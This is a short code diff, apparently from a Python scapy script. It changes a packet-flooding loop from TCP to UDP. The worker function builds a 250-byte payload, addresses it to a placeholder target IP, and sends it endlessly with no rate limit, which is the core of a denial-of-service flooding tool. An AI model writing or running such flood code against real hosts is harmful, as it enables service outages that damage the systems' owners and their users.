@@ -6,7 +6,7 @@ from scapy.all import *
 def worker(id):
 
     msg = 'A' * 250
-    pkt = IP(dst='<target_ip>')/TCP()/msg
+    pkt = IP(dst='<target_ip>')/UDP()/msg
     while True:
         send(pkt)
 
